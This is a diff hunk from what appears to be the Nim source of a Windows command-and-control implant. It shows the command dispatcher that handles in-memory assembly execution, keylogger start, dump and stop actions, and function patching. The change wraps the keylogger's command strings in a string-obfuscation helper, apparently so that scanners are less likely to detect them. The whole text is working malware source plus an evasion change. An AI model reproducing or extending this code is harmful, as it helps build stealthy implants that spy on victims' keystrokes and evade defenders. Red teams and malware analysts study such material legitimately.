@@ -602,11 +602,11 @@ proc windows_parse_command*(command: JsonNode): bool =
             is_success = wrap_execute_assembly(command["assembly_base64"].getStr(), command["assembly_args"].getStr())
         of protectString("keylog"):
             var keylog_action = command[protectString("action")].getStr()
-            if keylog_action == "start":
+            if keylog_action == protectString("start"):
                 is_success = wrap_keylog_start()
-            elif keylog_action == "dump":
+            elif keylog_action == protectString("dump"):
                 is_success = wrap_keylog_dump()
-            if keylog_action == "stop":
+            if keylog_action == protectString("stop"):
                 is_success = wrap_keylog_stop()                                
         of protectString("patch"):
             is_success = wrap_patch_func(command[protectString("patch_func")].getStr())
